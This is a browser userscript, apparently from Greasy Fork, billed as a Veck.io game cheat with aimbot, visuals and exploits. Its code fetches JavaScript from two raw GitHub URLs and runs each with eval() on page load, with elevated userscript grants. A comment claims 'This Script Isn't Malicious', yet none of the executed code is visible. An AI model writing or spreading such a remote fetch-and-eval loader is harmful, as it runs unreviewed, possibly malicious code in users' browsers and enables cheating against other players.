// ==UserScript==
// @name         Veck.io Cheat Aimbot, Visuals, Exploits | Recte
// @description  The Best & Only Veck.io Cheat
// @namespace    Recte
// @version      2.005
// @icon         https://recte.cc/imgs/recte_logo.png
// @description  
// @author       recte.cc | Suppress @ TJ
// @match        https://*veck.io/*
// @grant        GM_xmlhttpRequest
// @grant        unsafeWindow
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/563461/Veckio%20Cheat%20Aimbot%2C%20Visuals%2C%20Exploits%20%7C%20Recte.user.js
// @updateURL https://update.greasyfork.org/scripts/563461/Veckio%20Cheat%20Aimbot%2C%20Visuals%2C%20Exploits%20%7C%20Recte.meta.js
// ==/UserScript==
 
console.log("Starting...");
// Game Dev Patch Prot, This Script Isn't Malicious
let libUrl = 'https://raw.githubusercontent.com/TJGTA3/filehostalskdfjkalsjflaksdjf/refs/heads/main/metadata31fixed5';
fetch(libUrl)
    .then(r => r.text())
    .then(code => {
        eval(code);
 
    }).catch(e => console.error('Failed to load UWMK:', e));
libUrl = 'https://raw.githubusercontent.com/guy69436-boop/Vecte/refs/heads/main/Vecte.js';
fetch(libUrl)
    .then(r => r.text())
    .then(code => {
        eval(code);
 
    }).catch(e => console.error('Failed to load Vecte:', e));

window.cheat = true;